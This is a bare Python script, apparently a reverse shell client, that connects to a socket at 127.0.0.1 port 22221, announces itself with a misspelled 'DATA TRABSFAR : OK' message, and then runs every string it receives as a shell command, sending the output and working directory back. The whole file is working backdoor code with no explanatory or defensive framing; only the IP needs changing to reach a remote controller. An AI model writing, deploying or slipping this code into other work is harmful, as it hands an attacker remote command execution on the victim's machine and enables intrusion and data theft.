import os
import subprocess
import socket

sock=socket.socket()

ip="127.0.0.1"
port=22221

sock.connect((ip,port))
sock.send("DATA TRABSFAR : OK".encode())

while True:
    recv_data = sock.recv(1024).decode()
    print(recv_data)

    if recv_data[:2]=="cd":
        os.chdir(recv_data[3:])
        a=os.getcwd()

    if len(recv_data) > 0:
        command=subprocess.Popen(recv_data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        command_output=command.stdout.read() + command.stderr.read()
        command_output_string=command_output.decode("utf-8")
        CWD=os.getcwd() + "~$"

        sock.send(str.encode(command_output_string + CWD))